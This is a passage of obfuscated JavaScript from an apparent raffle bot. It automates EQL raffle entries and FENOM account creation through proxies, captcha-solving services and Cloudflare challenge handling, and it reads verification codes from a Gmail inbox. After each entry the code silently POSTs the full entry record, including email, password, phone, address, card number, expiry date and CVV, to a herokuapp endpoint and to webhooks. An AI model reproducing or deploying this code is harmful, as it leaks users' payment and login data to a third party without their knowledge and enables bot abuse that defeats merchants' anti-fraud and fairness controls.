                            await _0x32344d(0x3e8), await _0x32344d(0x1f4), await _0x52615e['type']('#address1', _0x546f00[_0x49e510]['Address1'] + '\x20' + _0x546f00[_0x49e510]['HouseNumber']), await _0x32344d(0x1f4), await _0x52615e['type']('#address2', '' + _0x546f00[_0x49e510]['Address2']), await _0x32344d(0x1f4), await _0x52615e['type']('#city', '' + _0x546f00[_0x49e510]['City']), await _0x32344d(0x1f4), await _0x52615e['type']('#postcode', '' + _0x546f00[_0x49e510]['Zip']), await _0x32344d(0x3e8), await _0x52615e['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x32344d(0x3e8), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            try {
                                await _0x52615e['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]');
                            } catch {
                                throw new Error('No\x20Payment\x20Token\x20Found');
                            }
                            await _0x32344d(0x7d0), await _0x52615e['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x32344d(0x12c), await _0x52615e['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x32344d(0x4b0), await _0x52615e['keyboard']['type']('' + _0x546f00[_0x49e510]['CardNumber']), await _0x32344d(0x320), await _0x52615e['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x52615e['keyboard']['type']('' + _0x546f00[_0x49e510]['ExpiryDate']), await _0x32344d(0x4b0), await _0x52615e['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x52615e['keyboard']['type']('' + _0x546f00[_0x49e510]['CVV']), await _0x32344d(0x226), await _0x52615e['type']('input[name=\x22postalCode\x22]', '' + _0x546f00[_0x49e510]['Zip']), await _0x32344d(0x226), await _0x52615e['click']('#paymentConsent'), await _0x32344d(0x226), await _0x52615e['click']('#termsConsent'), await _0x32344d(0x2bc), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x52615e['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x32344d(0x2710);
                            try {
                                await _0x52615e['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x32344d(0xbb8), await _0x52615e['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2de1fa => _0x2de1fa['click']()), await _0x52615e['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5f54b5 => _0x5f54b5['click']());
                            } catch {
                            }
                            try {
                                await _0x52615e['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x572494 = await _0x52615e['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x572494) {
                                    _0x4fe38c['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x546f00[_0x49e510]['Email'] + ',' + _0x546f00[_0x49e510]['Password'] + ',' + _0x546f00[_0x49e510]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x4a0283() {
                                var _0x1a0a75, _0x1683f9 = ![];
                                for (var _0x121108 = 0x0; _0x121108 < 0x18; _0x121108++) {
                                    async function _0x439998() {
                                        var _0x4b9b00 = new _0x16dd9e({
                                            'user': _0x8aa917['masterMail'],
                                            'password': _0x8aa917['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x5901fd(_0x8443a0) {
                                            _0x4b9b00['openBox']('INBOX', ![], _0x8443a0);
                                        }
                                        _0x4b9b00['once']('ready', function () {
                                            console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x5901fd(function (_0x3df326, _0x173f25) {
                                                console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x3df326)
                                                    throw _0x3df326;
                                                _0x4b9b00['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x401d27, _0x1da761) {
                                                    if (!_0x1da761 || !_0x1da761['length'])
                                                        console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x4b9b00['end']();
                                                    else {
                                                        var _0x4e2185 = _0x4b9b00['seq']['fetch'](_0x1da761, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4e2185['on']('message', function (_0x504fed, _0x13c08e) {
                                                            var _0x6d0401 = '(#' + _0x13c08e + ')\x20';
                                                            _0x504fed['on']('body', function (_0x4f6197, _0x12a0ef) {
                                                                _0x4b0324(_0x4f6197, (_0x1b53e2, _0x41189e) => {
                                                                    if (_0x41189e['subject']['includes']('code')) {
                                                                        const _0x1d59e6 = _0x41189e['text']['split']('\x0a\x0a')[0x3], _0x282a02 = _0x1d59e6['split']('\x0a')[0x1];
                                                                        _0x1a0a75 = _0x282a02;
                                                                    }
                                                                });
                                                            }), _0x504fed['once']('end', function () {
                                                            });
                                                        }), _0x4e2185['once']('error', function (_0x1b2761) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4e2185['once']('end', function () {
                                                            _0x4b9b00['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x4b9b00['once']('error', function (_0x3c50b2) {
                                            console['log'](_0x5b4136['red'](_0x3c50b2['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1683f9 = !![];
                                        }), _0x4b9b00['once']('end', async function () {
                                        }), _0x4b9b00['connect']();
                                    }
                                    _0x439998(), await _0x32344d(0x1388);
                                    if (_0x1a0a75)
                                        return _0x1a0a75;
                                    if (_0x1683f9)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x121108 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x4a0283(), await _0x32344d(0x1f4), await _0x52615e['type']('#code', '' + code), await _0x32344d(0x3e8), await _0x52615e['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x565341 => _0x565341['click']()), await _0x52615e['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x52615e['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x546f00[_0x49e510]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x4fe38c['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x546f00[_0x49e510]['Email'] + ',' + _0x546f00[_0x49e510]['Password'] + ',' + _0x546f00[_0x49e510]['Phone']), _0x144472 = 'no', _0x5677a4(_0x546f00[_0x49e510], _0x1a09bb);
                            var _0x25bc5d = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'dev', ![]), _0x591dfa = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'pub', ![]);
                            let _0x1a609c = _0x546f00[_0x49e510];
                            try {
                                prxdata = {
                                    'username': _0x4b3861['replace']('#', ''),
                                    'module': _0x1a09bb['name'],
                                    'entrydata': JSON['stringify'](_0x1a609c),
                                    'proxy': '' + _0x568bf8[_0x49e510]
                                };
                                var _0x4e40bf = JSON['stringify'](prxdata);
                                let _0x7e6803 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x4e40bf, _0x7e6803);
                            } catch (_0x55d0f4) {
                            }
                            const _0x1d2725 = {
                                'succesDEVMSG': { 'embeds': [_0x25bc5d] },
                                'succesPUBMSG': { 'embeds': [_0x591dfa] }
                            };
                            try {
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x1d2725['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x1d2725['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x583375, _0x1d2725['succesPUBMSG']);
                            } catch (_0x1531d0) {
                                console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x1531d0));
                            }
                        } catch (_0x5da2b8) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20' + _0x5da2b8)), _0x27d311 = '' + _0x5da2b8;
                            var _0x164563 = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'dev', !![], _0x27d311), _0x25bc5d = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'dev', ![]), _0x591dfa = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'pub', ![]);
                            const _0x3e5ad9 = {
                                'succesDEVMSG': { 'embeds': [_0x25bc5d] },
                                'succesPUBMSG': { 'embeds': [_0x591dfa] }
                            };
                            _0x3e5ad9['errorDEV'] = { 'embeds': [_0x164563] };
                            _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x3e5ad9['errorDEV']);
                            await _0x16e110(_0x3ba800, _0x3e5ad9['errorDEV']);
                            if (!_0x144472 == 'no')
                                _0x144472 = 'yes';
                        } finally {
                            _0x1f5b01 && _0x1f5b01['close']();
                            if (_0x144472 == 'yes' && _0xe9258c != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Retrying\x20(' + _0xe9258c + '\x20/\x205)')), _0x49e510 = _0x49e510 - 0x1, _0xe9258c = _0xe9258c + 0x1;
                                continue;
                            }
                            _0x144472 == 'yes' && _0xe9258c >= 0x5 && (_0x4af7c0(_0x546f00[_0x49e510], _0x1a09bb), _0x144472 = 'no', _0xe9258c = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    } else {
                        const _0xec76d9 = '' + _0x546f00[_0x49e510]['Url'];
                        if (_0x144472 != 'yes')
                            var _0x144472 = '', _0xe9258c = 0x0;
                        if (_0x546f00[_0x49e510]['Email'] == '' || _0x546f00[_0x49e510]['FirstName'] == '' || _0x546f00[_0x49e510]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x546f00[_0x49e510]['Password'] == '' && (_0x546f00[_0x49e510]['Password'] = 'JRaffles23!');
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x197ff2 = _0x568bf8[_0x49e510]['split'](':');
                        else
                            var _0xfbf598 = Math['round'](Math['random']() * (_0x568bf8['length'] - 0x1)), _0x197ff2 = _0x568bf8[_0xfbf598]['split'](':');
                        var _0x1f5b01;
                        try {
                            _0x1f5b01 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x197ff2[0x0] + ':' + _0x197ff2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f5b01 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x197ff2[0x0] + ':' + _0x197ff2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4784dd = await _0x1f5b01['newPage']();
                            await _0x4784dd['authenticate']({
                                'username': '' + _0x197ff2[0x2],
                                'password': '' + _0x197ff2[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4784dd['setRequestInterception'](!![]), _0x4784dd['on']('request', _0xfac4f => {
                                _0xfac4f['resourceType']() === 'image' || _0xfac4f['resourceType']() === 'font' || _0xfac4f['resourceType']() === 'media' ? _0xfac4f['abort']() : _0xfac4f['continue']();
                            }), await _0x4784dd['goto'](_0xec76d9), await _0x4784dd['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x4784dd['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x32344d(0x7d0), await _0x4784dd['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x4784dd['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x32344d(0x3e8), await _0x4784dd['waitForSelector']('#email'), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4784dd['type']('#email', '' + _0x546f00[_0x49e510]['Email']), await _0x32344d(0x352), await _0x4784dd['waitForSelector']('#password'), await _0x4784dd['type']('#password', '' + _0x546f00[_0x49e510]['Password']), await _0x32344d(0x352), await _0x4784dd['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x32344d(0x3e8);
                            try {
                                await _0x4784dd['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x5677a4(_0x546f00[_0x49e510], _0x1a09bb), _0x144472 = 'no';
                                continue;
                            }
                            await _0x4784dd['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x32344d(0x3e8), await _0x4784dd['click']('li[data-value=\x22EU\x20' + _0x546f00[_0x49e510]['Size'] + '\x22]'), await _0x32344d(0x1f4), await _0x4784dd['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x4784dd['focus']('#postcode'), await _0x4784dd['keyboard']['down']('Control'), await _0x4784dd['keyboard']['press']('A'), await _0x4784dd['keyboard']['up']('Control'), await _0x4784dd['keyboard']['press']('Backspace'), await _0x4784dd['keyboard']['type'](_0x546f00[_0x49e510]['Zip']), await _0x32344d(0x60e), await _0x4784dd['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x32344d(0x3e8), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4784dd['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4784dd['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4784dd['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x32344d(0x4b0), await _0x4784dd['keyboard']['type']('' + _0x546f00[_0x49e510]['CardNumber']), await _0x32344d(0x320), await _0x4784dd['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4784dd['keyboard']['type']('' + _0x546f00[_0x49e510]['ExpiryDate']), await _0x32344d(0x4b0), await _0x4784dd['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4784dd['keyboard']['type']('' + _0x546f00[_0x49e510]['CVV']), await _0x32344d(0x226), await _0x4784dd['type']('input[name=\x22postalCode\x22]', '' + _0x546f00[_0x49e510]['Zip']), await _0x32344d(0x226), await _0x4784dd['click']('#paymentConsent'), await _0x32344d(0x226), await _0x4784dd['click']('#termsConsent'), await _0x32344d(0x2bc), console['log'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4784dd['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x32344d(0x2710);
                            try {
                                await _0x4784dd['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x32344d(0xbb8), await _0x4784dd['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x18dc40 => _0x18dc40['click']()), await _0x4784dd['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x280255 => _0x280255['click']());
                            } catch {
                            }
                            try {
                                await _0x4784dd['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x5677a4(_0x546f00[_0x49e510], _0x1a09bb);
                            var _0x25bc5d = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'dev', ![]), _0x591dfa = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'pub', ![]);
                            let _0x34a117 = _0x546f00[_0x49e510];
                            try {
                                prxdata = {
                                    'username': _0x4b3861['replace']('#', ''),
                                    'module': _0x1a09bb['name'],
                                    'entrydata': JSON['stringify'](_0x34a117),
                                    'proxy': '' + _0x568bf8[_0x49e510]
                                };
                                var _0x4e40bf = JSON['stringify'](prxdata);
                                let _0x8d7983 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x4e40bf, _0x8d7983);
                            } catch (_0x179662) {
                            }
                            const _0x40e16f = {
                                'succesDEVMSG': { 'embeds': [_0x25bc5d] },
                                'succesPUBMSG': { 'embeds': [_0x591dfa] }
                            };
                            try {
                                _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x40e16f['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x40e16f['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x583375, _0x40e16f['succesPUBMSG']);
                            } catch (_0x11da60) {
                                console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x11da60));
                            }
                            _0x144472 = 'no';
                        } catch (_0x3b11c5) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20' + _0x3b11c5)), _0x27d311 = '' + _0x3b11c5;
                            var _0x164563 = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'dev', !![], _0x27d311), _0x25bc5d = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'dev', ![]), _0x591dfa = await _0xe56989(_0x546f00[_0x49e510], _0x1a09bb, 'pub', ![]);
                            const _0x4da7ce = {
                                'succesDEVMSG': { 'embeds': [_0x25bc5d] },
                                'succesPUBMSG': { 'embeds': [_0x591dfa] }
                            };
                            _0x4da7ce['errorDEV'] = { 'embeds': [_0x164563] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x4da7ce['errorDEV']), await _0x16e110(_0x3ba800, _0x4da7ce['errorDEV']), _0x144472 = 'yes';
                        } finally {
                            _0x1f5b01 && _0x1f5b01['close']();
                            if (_0x144472 == 'yes' && _0xe9258c != 0x5) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x1a09bb['name'] + ']\x20Task\x20' + (_0x49e510 + 0x1) + '\x20:\x20Retrying\x20(' + _0xe9258c + '\x20/\x205)')), _0x49e510 = _0x49e510 - 0x1, _0xe9258c = _0xe9258c + 0x1;
                                continue;
                            }
                            _0x144472 == 'yes' && _0xe9258c >= 0x5 && (_0x4af7c0(_0x546f00[_0x49e510], _0x1a09bb), _0x144472 = 'no', _0xe9258c = 0x0), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x2d54b9, _0x2b565b, _0x5253ad) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4d263b = 0x0; _0x4d263b < _0x2b565b['length']; _0x4d263b++) {
                        if (_0x3760d9 != 'yes')
                            var _0x3760d9 = '', _0x2d6892 = 0x0;
                        var _0x39001d;
                        try {
                            await _0x4669df(_0x2b565b, _0x4d263b);
                        } catch {
                            _0x3760d9 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x299f70(_0x2d54b9['name'] + '\x20Task\x20' + (_0x4d263b + 0x1) + '\x20/\x20' + _0x2b565b['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        var _0x1ab15b = await _0xe56989(_0x2b565b[_0x4d263b], _0x2d54b9, 'acc', ![]);
                        const _0x2cb7a4 = { 'succesDEVMSG': { 'embeds': [_0x1ab15b] } }, _0xac0642 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x543f5e = Math['round'](Math['random']() * (_0x5253ad['length'] - 0x1)), _0xa2df35 = _0x5253ad[_0x543f5e]['split'](':'), _0x2cd27e;
                        try {
                            _0x2cd27e = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xa2df35[0x0] + ':' + _0xa2df35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2cd27e = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0xa2df35[0x0] + ':' + _0xa2df35[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2efc06 = await _0x2cd27e['newPage']();
                            await _0x2efc06['setViewport']({
                                'width': 0x500 + _0x4f2c19(0x1, 0x32),
                                'height': 0x2d9 + _0x4f2c19(0x1, 0x32)
                            });
                            const _0x606cb3 = await _0x2efc06['target']()['createCDPSession'](), { windowId: _0x1419d9 } = await _0x606cb3['send']('Browser.getWindowForTarget');
                            await _0x2efc06['authenticate']({
                                'username': '' + _0xa2df35[0x2],
                                'password': '' + _0xa2df35[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2efc06['goto']('' + _0xac0642, { 'waitUntil': 'networkidle2' }), console['log'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x32344d(0x1388);
                            var _0x5b1106 = await _0x2efc06['$']('.hcaptcha-box');
                            if (_0x5b1106) {
                                console['log'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x32344d(0x2710);
                                const _0x3694a8 = await _0x2efc06['$']('.hcaptcha-box');
                                if (_0x3694a8)
                                    try {
                                        await _0x3694a8['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x2efc06['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x4257c6 = await _0x2efc06['$']('.hcaptcha-box');
                                    if (_0x4257c6)
                                        try {
                                            await _0x4257c6['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x2efc06['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x606cb3['send']('Browser.setWindowBounds', {
                                    'windowId': _0x1419d9,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x32344d(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2efc06['type']('input[name=\x22firstname\x22]', '' + _0x2b565b[_0x4d263b]['FirstName']), await _0x32344d(0x1f4), await _0x2efc06['type']('input[name=\x22lastname\x22]', '' + _0x2b565b[_0x4d263b]['LastName']), await _0x32344d(0x1f4), await _0x2efc06['type']('input[name=\x22email\x22]', '' + _0x2b565b[_0x4d263b]['Email']), await _0x32344d(0x1f4), await _0x2efc06['type']('input[name=\x22password\x22]', '' + _0x2b565b[_0x4d263b]['Password']), await _0x32344d(0x258), await _0x2efc06['$eval']('input[name=\x22psgdpr\x22]', _0x28f60c => _0x28f60c['click']()), await _0x32344d(0x1f4), console['log'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2efc06['$eval']('#customer-form', _0x1f9bfc => _0x1f9bfc['submit']());
                            try {
                                try {
                                    await _0x2efc06['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x3760d9 = 'no', console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20Account\x20' + _0x2b565b[_0x4d263b]['Email'] + '\x20Generated')), _0x4fe38c['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2b565b[_0x4d263b]['Email'] + ',' + _0x2b565b[_0x4d263b]['Password']);
                                let _0x24f333 = _0x2b565b[_0x4d263b];
                                try {
                                    prxdata = {
                                        'username': _0x4b3861['replace']('#', ''),
                                        'module': _0x2d54b9['name'],
                                        'entrydata': JSON['stringify'](_0x24f333),
                                        'proxy': '' + _0x5253ad[_0x4d263b]
                                    };
                                    var _0x553fd1 = JSON['stringify'](prxdata);
